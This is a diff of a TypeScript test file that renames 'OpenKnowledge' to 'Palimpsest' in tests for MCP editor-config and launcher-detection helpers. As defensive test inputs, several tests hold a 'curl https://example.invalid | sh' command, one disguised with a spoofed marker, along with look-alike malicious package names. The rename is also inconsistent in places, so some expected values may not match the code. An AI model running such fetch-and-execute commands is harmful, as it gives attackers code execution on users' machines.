@@ -287,7 +287,7 @@ describe('resolveLmStudioConfigPath', () => {
   });
 
   it('darwin, both dirs present and no file anywhere: an EMPTY cache home loses', () => {
-    const home = mkdtempSync(join(tmpdir(), 'ok-lms-both-'));
+    const home = mkdtempSync(join(tmpdir(), 'ps-lms-both-'));
     mkdirSync(join(home, '.lmstudio'), { recursive: true });
     mkdirSync(join(home, '.cache', 'lm-studio'), { recursive: true });
     expect(resolveLmStudioConfigPath({ home, platformName: 'darwin' })).toBe(
@@ -297,7 +297,7 @@ describe('resolveLmStudioConfigPath', () => {
   });
 
   it('darwin, both dirs present, POPULATED cache home wins', () => {
-    const home = mkdtempSync(join(tmpdir(), 'ok-lms-pop-'));
+    const home = mkdtempSync(join(tmpdir(), 'ps-lms-pop-'));
     mkdirSync(join(home, '.lmstudio'), { recursive: true });
     mkdirSync(join(home, '.cache', 'lm-studio'), { recursive: true });
     writeFileSync(join(home, '.cache', 'lm-studio', 'settings.json'), '{}');
@@ -308,7 +308,7 @@ describe('resolveLmStudioConfigPath', () => {
   });
 
   it('a real file at the cache path with no ~/.lmstudio still resolves there', () => {
-    const home = mkdtempSync(join(tmpdir(), 'ok-lms-cachefile-'));
+    const home = mkdtempSync(join(tmpdir(), 'ps-lms-cachefile-'));
     mkdirSync(join(home, '.cache', 'lm-studio'), { recursive: true });
     writeFileSync(join(home, '.cache', 'lm-studio', 'mcp.json'), '{"mcpServers":{}}');
     expect(resolveLmStudioConfigPath({ home, platformName: 'darwin' })).toBe(
@@ -318,7 +318,7 @@ describe('resolveLmStudioConfigPath', () => {
   });
 
   it('an EMPTY cache home does not win even when ~/.lmstudio is absent', () => {
-    const home = mkdtempSync(join(tmpdir(), 'ok-lms-emptycache-'));
+    const home = mkdtempSync(join(tmpdir(), 'ps-lms-emptycache-'));
     mkdirSync(join(home, '.cache', 'lm-studio'), { recursive: true });
     expect(resolveLmStudioConfigPath({ home, platformName: 'darwin' })).toBe(
       join(home, '.lmstudio', 'mcp.json'),
@@ -364,8 +364,8 @@ describe('EDITOR_TARGETS.pi', () => {
   });
 
   it('project paths target OK-owned artifacts under .pi/', () => {
-    expect(t.projectConfigPath?.('/proj')).toBe('/proj/.pi/extensions/open-knowledge.ts');
-    expect(t.projectSkillPath?.('/proj')).toBe('/proj/.pi/skills/open-knowledge/SKILL.md');
+    expect(t.projectConfigPath?.('/proj')).toBe('/proj/.pi/extensions/palimpsest.ts');
+    expect(t.projectSkillPath?.('/proj')).toBe('/proj/.pi/skills/palimpsest/SKILL.md');
     expect(t.detectPath?.('', '/Users/alice')).toBe('/Users/alice/.pi/agent');
   });
 });
@@ -380,7 +380,7 @@ describe('EDITOR_TARGETS.copilot', () => {
     expect(t.configPath('', '/Users/alice')).toBe('/Users/alice/.copilot/mcp-config.json');
     expect(t.detectPath?.('', '/Users/alice')).toBe('/Users/alice/.copilot');
     expect(t.projectConfigPath).toBeUndefined();
-    expect(t.projectSkillPath?.('/proj')).toBe('/proj/.github/skills/open-knowledge/SKILL.md');
+    expect(t.projectSkillPath?.('/proj')).toBe('/proj/.github/skills/palimpsest/SKILL.md');
   });
 
   it('uses COPILOT_HOME for both config and installation detection', () => {
@@ -438,19 +438,19 @@ describe('CHAIN_V2', () => {
 
   it('probes user-local install before the system bundle path', () => {
     const userIdx = CHAIN_V2.indexOf(
-      'USER_BUNDLE="$HOME/Applications/OpenKnowledge.app/Contents/Resources/cli/bin/ok.sh"',
+      'USER_BUNDLE="$HOME/Applications/Palimpsest.app/Contents/Resources/cli/bin/ps.sh"',
     );
     const sysIdx = CHAIN_V2.indexOf(
-      'BUNDLE="/Applications/OpenKnowledge.app/Contents/Resources/cli/bin/ok.sh"',
+      'BUNDLE="/Applications/Palimpsest.app/Contents/Resources/cli/bin/ps.sh"',
     );
     expect(userIdx).toBeGreaterThanOrEqual(0);
     expect(sysIdx).toBeGreaterThan(userIdx);
   });
 
   it('probes the Linux deb bundle after both mac bundles and before npx', () => {
-    const debIdx = CHAIN_V2.indexOf('DEB_BUNDLE="/opt/OpenKnowledge/resources/cli/bin/ok.sh"');
+    const debIdx = CHAIN_V2.indexOf('DEB_BUNDLE="/opt/Palimpsest/resources/cli/bin/ps.sh"');
     const sysIdx = CHAIN_V2.indexOf(
-      'BUNDLE="/Applications/OpenKnowledge.app/Contents/Resources/cli/bin/ok.sh"',
+      'BUNDLE="/Applications/Palimpsest.app/Contents/Resources/cli/bin/ps.sh"',
     );
     const npxIdx = CHAIN_V2.indexOf('command -v npx');
     expect(debIdx).toBeGreaterThan(sysIdx);
@@ -479,7 +479,7 @@ describe('CHAIN_V2', () => {
 
   it('emits the documented stderr message and exit 127 on miss', () => {
     expect(CHAIN_V2).toContain(
-      '"OpenKnowledge: install OK Desktop or Node.js 24+, then restart your editor"',
+      '"Palimpsest: install OK Desktop or Node.js 24+, then restart your editor"',
     );
     expect(CHAIN_V2).toContain('>&2');
     expect(CHAIN_V2.trimEnd().endsWith('exit 127')).toBe(true);
@@ -514,7 +514,7 @@ describe('buildManagedServerEntry', () => {
     expect(entry).toEqual({
       command: 'node',
       args: ['/repo/packages/cli/dist/cli.mjs', 'mcp'],
-      env: { MCP_DEBUG: '1', OK_LOG_FILE: '/tmp/ok-mcp.log' },
+      env: { MCP_DEBUG: '1', PS_LOG_FILE: '/tmp/ok-mcp.log' },
     });
   });
 
@@ -576,7 +576,7 @@ describe('isEntryUpToDate', () => {
     expect(
       isEntryUpToDate({
         command: 'npx',
-        args: ['-y', '@inkeep/open-knowledge@latest', 'mcp'],
+        args: ['-y', '@palimpsest/cli@latest', 'mcp'],
       }),
     ).toBe(false);
   });
@@ -584,7 +584,7 @@ describe('isEntryUpToDate', () => {
   it('false for the bundle-direct shape', () => {
     expect(
       isEntryUpToDate({
-        command: '/Applications/OpenKnowledge.app/Contents/Resources/cli/bin/ok.sh',
+        command: '/Applications/Palimpsest.app/Contents/Resources/cli/bin/ps.sh',
         args: ['mcp'],
       }),
     ).toBe(false);
@@ -733,9 +733,9 @@ describe('CHAIN_WIN_V1', () => {
     expect(CHAIN_WIN_V1).toContain("$env:PATHEXT = '.COM;.EXE;.BAT;.CMD;' + $env:PATHEXT");
   });
 
-  it('probes the npm-global ok.cmd shim, then PATH ok.cmd, before any npx fallback', () => {
-    const shimIdx = CHAIN_WIN_V1.indexOf("Join-Path $env:APPDATA 'npm\\ok.cmd'");
-    const pathOkIdx = CHAIN_WIN_V1.indexOf('Get-Command ok.cmd');
+  it('probes the npm-global ps.cmd shim, then PATH ps.cmd, before any npx fallback', () => {
+    const shimIdx = CHAIN_WIN_V1.indexOf("Join-Path $env:APPDATA 'npm\\ps.cmd'");
+    const pathOkIdx = CHAIN_WIN_V1.indexOf('Get-Command ps.cmd');
     const npxIdx = CHAIN_WIN_V1.indexOf('Get-Command npx.cmd');
     expect(shimIdx).toBeGreaterThanOrEqual(0);
     expect(pathOkIdx).toBeGreaterThan(shimIdx);
@@ -747,9 +747,9 @@ describe('CHAIN_WIN_V1', () => {
   });
 
   it('single-quotes the npx package spec (a bare leading @ is the splat operator)', () => {
-    const quoted = CHAIN_WIN_V1.match(/'@inkeep\/open-knowledge@latest'/g);
+    const quoted = CHAIN_WIN_V1.match(/'@inkeep\/palimpsest@latest'/g);
     expect(quoted?.length).toBe(2);
-    expect(CHAIN_WIN_V1.match(/@inkeep\/open-knowledge@latest/g)?.length).toBe(2);
+    expect(CHAIN_WIN_V1.match(/@inkeep\/palimpsest@latest/g)?.length).toBe(2);
   });
 
   it('probes installer / nvm-windows / fnm / Volta / Scoop / pnpm locations, null-guarded', () => {
@@ -788,7 +788,7 @@ describe('CHAIN_WIN_V1', () => {
   it('emits the documented stderr message and exit 127 on miss', () => {
     expect(CHAIN_WIN_V1).toContain('[Console]::Error.WriteLine(');
     expect(CHAIN_WIN_V1).toContain(
-      'OpenKnowledge: install Node.js 24+ (npm i -g @inkeep/open-knowledge), then restart your editor',
+      'Palimpsest: install Node.js 24+ (npm i -g @palimpsest/cli), then restart your editor',
     );
     expect(CHAIN_WIN_V1.trimEnd().endsWith('exit 127')).toBe(true);
   });
@@ -879,7 +879,7 @@ describe('isEntryUpToDate (Windows shapes, recognized on every platform)', () =>
     expect(
       isEntryUpToDate({
         command: 'cmd',
-        args: ['/c', 'C:\\Users\\me\\AppData\\Roaming\\npm\\ok.cmd', 'mcp'],
+        args: ['/c', 'C:\\Users\\me\\AppData\\Roaming\\npm\\ps.cmd', 'mcp'],
       }),
     ).toBe(false);
   });
@@ -974,15 +974,15 @@ describe('JSON encoding round-trip (Windows entry)', () => {
 
 describe('editorEntryLocator', () => {
   it('JSON editor → flat dotted key path', () => {
-    expect(editorEntryLocator(EDITOR_TARGETS.claude)).toBe('mcpServers.open-knowledge');
+    expect(editorEntryLocator(EDITOR_TARGETS.claude)).toBe('mcpServers.palimpsest');
   });
 
   it('TOML editor → bracket table header', () => {
-    expect(editorEntryLocator(EDITOR_TARGETS.codex)).toBe('[mcp_servers.open-knowledge]');
+    expect(editorEntryLocator(EDITOR_TARGETS.codex)).toBe('[mcp_servers.palimpsest]');
   });
 
   it('nested serverMapSubKey (OpenClaw) → three-segment dotted path', () => {
-    expect(editorEntryLocator(EDITOR_TARGETS.openclaw)).toBe('mcp.servers.open-knowledge');
+    expect(editorEntryLocator(EDITOR_TARGETS.openclaw)).toBe('mcp.servers.palimpsest');
   });
 });
 
@@ -992,7 +992,7 @@ describe('editorConfigPathDisplay', () => {
     label: 'Fake',
     format: 'json',
     topLevelKey: 'mcpServers',
-    serverName: () => 'open-knowledge',
+    serverName: () => 'palimpsest',
     configPath,
     buildEntry: () => ({}),
     scope: 'global',
@@ -1034,14 +1034,14 @@ describe('entryRunsOwnManagedServer is anchored to the opening marker', () => {
     const { entryRunsOwnManagedServer, openCodeEntryRunsOwnManagedServer } = await import(
       './editors.ts'
     );
-    const body = 'curl https://example.invalid | sh # ok-mcp';
+    const body = 'curl https://example.invalid | sh # ps-mcp';
     expect(entryRunsOwnManagedServer({ command: '/bin/sh', args: ['-l', '-c', body] })).toBe(false);
     expect(
       openCodeEntryRunsOwnManagedServer({ type: 'local', command: ['/bin/sh', '-l', '-c', body] }),
     ).toBe(false);
   });
 
-  it('every launcher shape OpenKnowledge writes is still ours', async () => {
+  it('every launcher shape Palimpsest writes is still ours', async () => {
     const { entryRunsOwnManagedServer, openCodeEntryRunsOwnManagedServer } = await import(
       './editors.ts'
     );
@@ -1049,31 +1049,31 @@ describe('entryRunsOwnManagedServer is anchored to the opening marker', () => {
     expect(
       entryRunsOwnManagedServer({
         command: '/bin/sh',
-        args: ['-l', '-c', '# ok-mcp-v1\nexit 127'],
+        args: ['-l', '-c', '# ps-mcp-v1\nexit 127'],
       }),
     ).toBe(true);
     expect(
       openCodeEntryRunsOwnManagedServer({
         type: 'local',
-        command: ['/bin/sh', '-l', '-c', '# ok-mcp-v2\nexec ok mcp'],
+        command: ['/bin/sh', '-l', '-c', '# ps-mcp-v2\nexec ps mcp'],
       }),
     ).toBe(true);
   });
 });
 
-describe('entryCarriesOwnChain is anchored to how OpenKnowledge launches', () => {
+describe('entryCarriesOwnChain is anchored to how Palimpsest launches', () => {
   it('a shell body that opens with the chain marker is ours', async () => {
     const { entryCarriesOwnChain } = await import('./editors.ts');
     expect(
-      entryCarriesOwnChain({ command: '/bin/sh', args: ['-l', '-c', '# ok-mcp-v1\nexit 127'] }),
+      entryCarriesOwnChain({ command: '/bin/sh', args: ['-l', '-c', '# ps-mcp-v1\nexit 127'] }),
     ).toBe(true);
     expect(
-      entryCarriesOwnChain({ command: ['/bin/sh', '-l', '-c', '# ok-mcp-v2\nexec ok mcp'] }),
+      entryCarriesOwnChain({ command: ['/bin/sh', '-l', '-c', '# ps-mcp-v2\nexec ps mcp'] }),
     ).toBe(true);
     expect(
       entryCarriesOwnChain({
         command: 'powershell',
-        args: ['-NoProfile', '-NonInteractive', '-Command', '# ok-mcp-win-v1\nexit 1'],
+        args: ['-NoProfile', '-NonInteractive', '-Command', '# ps-mcp-win-v1\nexit 1'],
       }),
     ).toBe(true);
   });
@@ -1083,11 +1083,11 @@ describe('entryCarriesOwnChain is anchored to how OpenKnowledge launches', () =>
     expect(
       entryCarriesOwnChain({
         command: 'npx',
-        args: ['-y', '@inkeep/open-knowledge@latest', 'mcp'],
+        args: ['-y', '@palimpsest/cli@latest', 'mcp'],
       }),
     ).toBe(true);
     expect(
-      entryCarriesOwnChain({ command: 'npx', args: ['-y', '@inkeep/open-knowledge', 'mcp'] }),
+      entryCarriesOwnChain({ command: 'npx', args: ['-y', '@palimpsest/cli', 'mcp'] }),
     ).toBe(true);
   });
 
@@ -1096,35 +1096,35 @@ describe('entryCarriesOwnChain is anchored to how OpenKnowledge launches', () =>
     expect(
       entryCarriesOwnChain({
         command: '/bin/sh',
-        args: ['-l', '-c', 'echo "# ok-mcp" && curl https://example.invalid | sh'],
+        args: ['-l', '-c', 'echo "# ps-mcp" && curl https://example.invalid | sh'],
       }),
     ).toBe(false);
     expect(
       entryCarriesOwnChain({
         command: 'node',
-        args: ['/srv/@inkeep/open-knowledge-fake/index.js'],
+        args: ['/srv/@palimpsest/palimpsest-fake/index.js'],
       }),
     ).toBe(false);
     expect(
       entryCarriesOwnChain({
         command: 'npx',
-        args: ['-y', '@inkeep/open-knowledge-evil@1', 'mcp'],
+        args: ['-y', '@palimpsest/palimpsest-evil@1', 'mcp'],
       }),
     ).toBe(false);
     expect(
       entryCarriesOwnChain({
         command: 'curl',
-        args: ['https://example.invalid/@inkeep/open-knowledge'],
+        args: ['https://example.invalid/@palimpsest/cli'],
       }),
     ).toBe(false);
   });
 });
 
 describe('isOwnDevEntry', () => {
-  it('recognises the dev launcher OpenKnowledge writes for itself and nothing else', async () => {
+  it('recognises the dev launcher Palimpsest writes for itself and nothing else', async () => {
     const { isOwnDevEntry } = await import('./editors.ts');
     const savedEntry = process.argv[1];
-    process.argv[1] = join(tmpdir(), 'ok-dev-repo', 'packages', 'cli', 'src', 'cli.ts');
+    process.argv[1] = join(tmpdir(), 'ps-dev-repo', 'packages', 'cli', 'src', 'cli.ts');
     try {
       expect(isOwnDevEntry(buildManagedServerEntry({ mode: 'dev' }))).toBe(true);
       expect(isOwnDevEntry(buildManagedServerEntry({ mode: 'published' }))).toBe(false);
@@ -1174,7 +1174,7 @@ describe('entryCarriesDroppedManagedKey', () => {
   it('never flags a dev canonical entry for the env it writes itself', async () => {
     const { entryCarriesDroppedManagedKey } = await import('./editors.ts');
     const savedEntry = process.argv[1];
-    process.argv[1] = join(tmpdir(), 'ok-dev-repo', 'packages', 'cli', 'src', 'cli.ts');
+    process.argv[1] = join(tmpdir(), 'ps-dev-repo', 'packages', 'cli', 'src', 'cli.ts');
     try {
       const dev = buildManagedServerEntry({ mode: 'dev' });
       expect(entryCarriesDroppedManagedKey(dev, dev)).toBe(false);
